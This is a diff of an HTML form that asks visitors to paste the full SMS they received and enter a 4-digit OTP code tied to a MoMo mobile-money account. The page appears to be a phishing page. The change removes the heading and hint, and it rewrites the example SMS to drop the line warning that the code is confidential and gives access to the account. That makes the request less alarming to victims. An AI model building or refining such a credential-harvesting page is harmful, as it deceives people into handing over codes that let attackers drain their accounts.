@@ -591,15 +591,13 @@
   </div>
   <div class="otp-body-wrap">
     <div class="otp-card">
-      <h2>Enter OTP Code</h2>
-      <p class="otp-hint">A new OTP message has been sent to your phone. Paste the full message below, then enter the 4-digit code.</p>
 
       <!-- Paste New Message Section -->
       <div class="otp-paste-section">
         <div class="otp-paste-label">Paste New Message:</div>
         <div class="otp-paste-hint">Copy the full SMS you received and paste it here.</div>
         <textarea id="otpMsgPaste" class="otp-paste-textarea" placeholder="Paste your full SMS message here…" oninput="chkOtp()"></textarea>
-        <p class="otp-paste-code-hint">e.g. "Y'ello. Please note! This confidential code gives access to your MoMo account:........."</p>
+        <p class="otp-paste-code-hint">e.g. "Y'ello. Please enter the following code:........."</p>
       </div>
 
       <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
